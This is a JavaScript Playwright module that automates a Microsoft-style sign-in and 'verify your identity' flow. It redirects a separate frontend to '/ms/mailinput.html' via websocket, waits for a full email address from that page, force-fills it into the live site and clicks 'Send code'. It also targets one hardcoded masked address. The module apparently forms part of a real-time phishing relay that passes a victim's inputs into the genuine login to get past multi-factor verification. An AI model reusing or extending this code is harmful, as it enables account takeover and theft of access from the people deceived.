/**
 * Email Handler
 * Handles email entry and input pages
 */

const globals = require('../config/globals');
const { sendToClient } = require('../services/websocket');
const { SELECTORS, TIMEOUTS, MAX_ATTEMPTS } = require('../config/constants');

/**
 * Handle email entry page (initial login)
 * @param {Object} page - Playwright page object
 * @param {string} email - Email address to enter
 */
async function handleEmailEntry(page, email) {
    console.log('📧 Handling email entry...');

    // Fill email field
    const emailInput = page.locator('input[type="email"], input[type="text"]').first();
    if (await emailInput.isVisible()) {
        await emailInput.fill(email);
        console.log('✅ Email entered');

        // Click next button
        const nextButton = page.locator('button:has-text("Next"), input[type="submit"], button[type="submit"]');
        if (await nextButton.isVisible()) {
            await nextButton.click();
            console.log('✅ Next button clicked');
        }
    }
}

/**
 * Handle email input page (after MFA selection) - WAIT FOR FULL EMAIL
 * @param {Object} page - Playwright page object
 */
async function handleEmailInput(page) {
    console.log('📧 Handling email input page...');

    sendToClient({
        status: 'email_input_ready',
        message: 'Email input page ready - Redirecting to email input page',
        redirect: '/ms/mailinput.html'
    });
    console.log('📤 Sent immediate email input notification to frontend - redirecting to /mailinput.html');

    let attempts = 0;
    const maxAttempts = MAX_ATTEMPTS.EMAIL_INPUT;
    console.log('⏳ Waiting for full email from frontend...');
    while (!globals.get('globalFullEmail') && attempts < maxAttempts) {
        attempts++;
        console.log(`🔄 Waiting for full email... (${attempts}/${maxAttempts})`);
        await page.waitForTimeout(1000);
    }

    const fullEmail = globals.get('globalFullEmail');
    if (!fullEmail) {
        console.log('⚠️ Timeout - No full email received from frontend');
        console.log('🔍 Please enter the full email manually in the browser');
        sendToClient({ status: 'email_input_failed', message: 'No full email received from frontend.' });
        return;
    }

    console.log(`✅ Received full email: ${fullEmail}`);

    // EXTENDED selectors
    const extendedSelectors = [
        'input[type="email"]',
        'input[name="email"]',
        'input[autocomplete*="email" i]',
        'input[placeholder*="email" i]',
        'input[aria-label*="email" i]',
        'input[id*="email" i]',
        'input[type="text"]:not([name])',
        // Try all visible text/number fields as ultimate fallback
        'input[type="text"]',
        'input[type="number"]',
        'input:not([type])',
    ];
    // Search all on the page and filter
    let allInputs = await page.locator('input').all();
    let success = false;
    let filledSelector = null;

    for (const selector of extendedSelectors) {
        try {
            const matches = await page.locator(selector).all();
            for (const input of matches) {
                if (!(await input.isVisible())) continue;

                // Remove readonly (just in case)
                await input.evaluate(el => el.removeAttribute && el.removeAttribute('readonly'));

                // TRACE: Log what we found
                console.log(`🔍 Found input candidate (selector: ${selector})`);

                // Method 1: Standard fill (most reliable for exact text)
                try {
                    await input.fill(''); // Clear first
                    await input.fill(fullEmail);
                } catch (e) {
                    console.log(`⚠️ Fill method failed: ${e.message}`);
                }

                // Verify Method 1
                let value = await input.inputValue().catch(() => '');
                console.log(`🔍 Post-fill check: "${value}"`);

                // Method 2: Clear + Type (if fill failed or mismatch)
                if (value !== fullEmail) {
                    console.log(`⚠️ Value mismatch after fill. Retrying with Type method...`);
                    try {
                        await input.click({ clickCount: 3 }); // Select all
                        await input.press('Backspace'); // Clear
                        await input.fill(''); // Ensure clear
                        await input.type(fullEmail, { delay: 50 }); // Slower typing
                    } catch (e) {
                        console.log(`⚠️ Type method failed: ${e.message}`);
                    }

                    value = await input.inputValue().catch(() => '');
                    console.log(`🔍 Post-type check: "${value}"`);
                }

                // Method 3: Direct DOM manipulation (Force set)
                if (value !== fullEmail) {
                    console.log(`⚠️ Value mismatch after type. Forcing value via evaluate...`);
                    await input.evaluate((el, v) => { el.value = v; }, fullEmail);
                    // Trigger events to ensure app knows value changed
                    await input.evaluate(el => {
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                    });

                    value = await input.inputValue().catch(() => '');
                    console.log(`🔍 Post-evaluate check: "${value}"`);
                }

                if ((value || '').trim().toLowerCase() === fullEmail.trim().toLowerCase()) {
                    console.log(`✅ Full email auto-filled successfully (selector: ${selector})`);
                    success = true; filledSelector = selector; break;
                } else {
                    console.log(`⚠️ Email fill verification failed (selector: ${selector}), final value: [${value}]`);
                }
            }
            if (success) break;
        } catch (e) {
            // Continue to next selector
        }
    }
    // Last resort: try each input field in the DOM list
    if (!success) {
        for (const input of allInputs) {
            try {
                if (!(await input.isVisible())) continue;
                // Remove readonly
                await input.evaluate(el => el.removeAttribute && el.removeAttribute('readonly'));
                await input.click({ clickCount: 3 }).catch(() => { });
                await input.press('Backspace').catch(() => { });
                await input.fill('');
                await input.type(fullEmail, { delay: 30 });
                let value = await input.inputValue().catch(() => "");
                if ((value || '').trim().toLowerCase() === fullEmail.trim().toLowerCase()) {
                    console.log(`✅ Full email auto-filled Fallback [input DOM index]`);
                    success = true; break;
                }
            } catch { }
        }
    }
    if (!success) {
        console.log('❌ Could not find or fill email input field - checked all fallbacks.');
        sendToClient({ status: 'email_input_failed', message: 'Could not fill email field in browser. Manual intervention needed.' });
        return;
    }

    // Now find and click "Send code" button
    const sendCodeSelectors = [
        'button:has-text("Send code")',
        'button:has-text("Send verification code")',
        'input[type="submit"][value*="Send"]',
        'button[type="submit"]',
        '.send-code-btn',
        '#send-code-btn',
        '[role="button"]:has-text("Send")',
        'button:enabled',
        'input[type="submit"]:enabled',
    ];
    let sendCodeClicked = false;

    for (const selector of sendCodeSelectors) {
        try {
            const btns = await page.locator(selector).all();
            for (const btn of btns) {
                if (!(await btn.isVisible()) || (await btn.isDisabled && await btn.isDisabled())) continue;
                await btn.click({ force: true });
                console.log(`✅ Clicked send code button (selector: ${selector})`);
                sendCodeClicked = true;
                // Wait short period for nav/fields to update
                await page.waitForTimeout(2000);
                break;
            }
            if (sendCodeClicked) break;
        } catch { }
    }
    // Fallback: Press Enter if no button worked
    if (!sendCodeClicked) {
        try { await page.keyboard.press('Enter'); sendCodeClicked = true; } catch { }
    }
    if (!sendCodeClicked) {
        console.log('❌ Could not find or click Send code button');
        sendToClient({ status: 'email_input_failed', message: 'Could not click Send Code button. Manual intervention needed.' });
        return;
    } else {
        console.log('✅ Email input automation completed - proceeding to code input');
    }
}

/**
 * Handle immediate email input (for HTTP POST endpoint)
 * @param {Object} page - Playwright page object
 * @param {string} fullEmail - Full email address to input
 * @returns {Promise<boolean>} Success status
 */
async function handleImmediateEmailInput(page, fullEmail) {
    console.log('🔄 Starting immediate email input handling...');
    console.log(`📧 Full email to input: ${fullEmail}`);

    if (!page) {
        console.log('❌ No page object available for immediate email input');
        return false;
    }

    try {
        // Wait for page to stabilize (might be transitioning)
        await page.waitForTimeout(1000);

        // Check current page - might be on verification_options or email_input
        let currentTitle = await page.title().catch(() => '');
        let currentUrl = page.url();
        let pageText = await page.textContent('body').catch(() => '');

        console.log(`🔍 Current page - Title: ${currentTitle}, URL: ${currentUrl.substring(0, 100)}...`);

        // Check if we're still on verification_options page - need to click masked email option first
        const isVerificationOptionsPage = (
            currentTitle.toLowerCase().includes('verify your identity') ||
            pageText.includes('kw*****@gmail.com') ||
            pageText.includes('Email kw*****@gmail.com') ||
            (await page.locator('button:has-text("Send code")').count() > 0 &&
                !(await page.locator('input[type="email"]').count() > 0))
        );

        if (isVerificationOptionsPage) {
            console.log('⚠️ Still on verification options page - need to click masked email option first');

            // Find and click the masked email option
            const maskedEmailOptions = await page.locator('button, a, [role="button"]').all();
            for (const option of maskedEmailOptions) {
                try {
                    const text = await option.textContent().catch(() => '');
                    if (text && text.includes('kw*****@gmail.com')) {
                        console.log(`✅ Found masked email option: "${text.trim()}"`);
                        await option.click();
                        console.log('✅ Clicked masked email option - waiting for navigation...');
                        await page.waitForTimeout(3000);
                        break;
                    }
                } catch (e) { }
            }

            // Re-check page after click
            currentTitle = await page.title().catch(() => '');
            pageText = await page.textContent('body').catch(() => '');
        }

        // Verify this is an email input page NOW
        const isEmailInputPage = (
            currentTitle.toLowerCase().includes('verify your email') ||
            pageText.toLowerCase().includes('verify your email') ||
            pageText.includes('Enter the email address where you can be reached') ||
            (await page.locator('input[type="email"]').count() > 0 &&
                pageText.toLowerCase().includes('verify'))
        );

        if (!isEmailInputPage) {
            console.log('⚠️ Not on email input page after navigation attempt');
            console.log(`   Current title: ${currentTitle}`);
            console.log(`   Has email input: ${await page.locator('input[type="email"]').count() > 0}`);
            // Try waiting a bit more for page to load
            await page.waitForTimeout(2000);
            const retryTitle = await page.title().catch(() => '');
            const retryText = await page.textContent('body').catch(() => '');
            const retryHasEmailInput = await page.locator('input[type="email"]').count() > 0;
            if (!retryTitle.toLowerCase().includes('verify your email') && !retryHasEmailInput) {
                console.log('❌ Still not on email input page after retry');
                return false;
            }
        }

        console.log('✅ Confirmed on email input page (or close enough)');

        // Use the same robust email filling logic as handleEmailInput
        const extendedSelectors = [
            'input[type="email"]',
            'input[name="email"]',
            'input[autocomplete*="email" i]',
            'input[placeholder*="email" i]',
            'input[aria-label*="email" i]',
            'input[id*="email" i]',
            'input[type="text"]:not([name])',
            'input[type="text"]',
            'input[type="number"]',
            'input:not([type])',
        ];

        let allInputs = await page.locator('input').all();
        let success = false;

        for (const selector of extendedSelectors) {
            try {
                const matches = await page.locator(selector).all();
                for (const input of matches) {
                    if (!(await input.isVisible())) continue;

                    // Remove readonly (just in case)
                    await input.evaluate(el => el.removeAttribute && el.removeAttribute('readonly'));

                    // TRACE: Log what we found
                    console.log(`🔍 Found input candidate (selector: ${selector})`);

                    // Method 1: Standard fill (most reliable for exact text)
                    try {
                        await input.fill(''); // Clear first
                        await input.fill(fullEmail);
                    } catch (e) {
                        console.log(`⚠️ Fill method failed: ${e.message}`);
                    }

                    // Verify Method 1
                    let value = await input.inputValue().catch(() => '');
                    console.log(`🔍 Post-fill check: "${value}"`);

                    // Method 2: Clear + Type (if fill failed or mismatch)
                    if (value !== fullEmail) {
                        console.log(`⚠️ Value mismatch after fill. Retrying with Type method...`);
                        try {
                            await input.click({ clickCount: 3 }); // Select all
                            await input.press('Backspace'); // Clear
                            await input.fill(''); // Ensure clear
                            await input.type(fullEmail, { delay: 50 }); // Slower typing
                        } catch (e) {
                            console.log(`⚠️ Type method failed: ${e.message}`);
                        }

                        value = await input.inputValue().catch(() => '');
                        console.log(`🔍 Post-type check: "${value}"`);
                    }

                    // Method 3: Direct DOM manipulation (Force set)
                    if (value !== fullEmail) {
                        console.log(`⚠️ Value mismatch after type. Forcing value via evaluate...`);
                        await input.evaluate((el, v) => { el.value = v; }, fullEmail);
                        // Trigger events to ensure app knows value changed
                        await input.evaluate(el => {
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                            el.dispatchEvent(new Event('change', { bubbles: true }));
                        });

                        value = await input.inputValue().catch(() => '');
                        console.log(`🔍 Post-evaluate check: "${value}"`);
                    }

                    if ((value || '').trim().toLowerCase() === fullEmail.trim().toLowerCase()) {
                        console.log(`✅ Successfully filled email: ${fullEmail} (selector: ${selector})`);
                        success = true;
                        break;
                    }
                }
                if (success) break;
            } catch (e) { }
        }

        // Last resort: try each input field
        if (!success) {
            for (const input of allInputs) {
                try {
                    if (!(await input.isVisible())) continue;
                    await input.evaluate(el => el.removeAttribute && el.removeAttribute('readonly'));
                    await input.click({ clickCount: 3 }).catch(() => { });
                    await input.press('Backspace').catch(() => { });
                    await input.fill('');
                    await input.type(fullEmail, { delay: 30 });
                    let value = await input.inputValue().catch(() => "");
                    if ((value || '').trim().toLowerCase() === fullEmail.trim().toLowerCase()) {
                        console.log(`✅ Successfully filled email (fallback)`);
                        success = true;
                        break;
                    }
                } catch { }
            }
        }

        if (!success) {
            console.log('❌ Could not fill email input field - checked all fallbacks');
            return false;
        }

        // Now click "Send code" button
        const sendCodeSelectors = [
            'button:has-text("Send code")',
            'button:has-text("Send verification code")',
            'input[type="submit"][value*="Send"]',
            'button[type="submit"]',
            '[role="button"]:has-text("Send")',
            'button:enabled',
            'input[type="submit"]:enabled',
        ];
        let sendCodeClicked = false;

        for (const selector of sendCodeSelectors) {
            try {
                const btns = await page.locator(selector).all();
                for (const btn of btns) {
                    if (!(await btn.isVisible()) || (await btn.isDisabled && await btn.isDisabled())) continue;
                    await btn.click({ force: true });
                    console.log(`✅ Clicked send code button (selector: ${selector})`);
                    sendCodeClicked = true;
                    await page.waitForTimeout(2000);
                    break;
                }
                if (sendCodeClicked) break;
            } catch { }
        }

        if (!sendCodeClicked) {
            try { await page.keyboard.press('Enter'); sendCodeClicked = true; } catch { }
        }

        if (!sendCodeClicked) {
            console.log('❌ Could not click Send code button');
            return false;
        }

        console.log('✅ Immediate email input completed successfully');
        return true;

    } catch (error) {
        console.error('❌ Error in immediate email input:', error.message);
        return false;
    }
}

module.exports = {
    handleEmailEntry,
    handleEmailInput,
    handleImmediateEmailInput
};

